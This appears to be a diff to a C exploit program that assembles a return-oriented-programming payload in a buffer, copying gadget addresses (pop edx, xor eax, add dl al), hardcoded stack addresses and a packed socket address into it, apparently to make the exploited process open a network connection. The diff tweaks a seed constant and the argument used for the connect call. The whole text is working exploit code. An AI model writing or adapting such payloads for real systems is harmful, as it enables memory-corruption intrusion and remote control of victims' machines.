@@ -64,7 +64,7 @@ int main(void)
   char sockaddr_in[] = "\x01\x02\x39\x30\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
   char sockaddr_in_addr[] = "\x28\x68\xbf\xbf"; // buf + 267
 
-  char con_arg_16_seed[] = "\xf0\x01\x01\x01";
+  char con_arg_16_seed[] = "\x10\x11\x11\x11";
   char con_arg_16_addr[] = "\x9c\x68\xbf\xbf"; // bufr + 383
 
   int i;
@@ -172,7 +172,7 @@ int main(void)
   strcpy(bufr + 351, xor_eax); // 0xbba9b3c2
   // pop connect arg into edx
   strcpy(bufr + 355, pop_edx); // 0xbbb9dc1b
-  strcpy(bufr + 359, con_arg_16_seed);
+  strcpy(bufr + 359, con_arg);
   // add first 8 bits of edx to eax
   strcpy(bufr + 363, add_dl_al); // 0xbbbb4607
                                 // eax should have 0x62
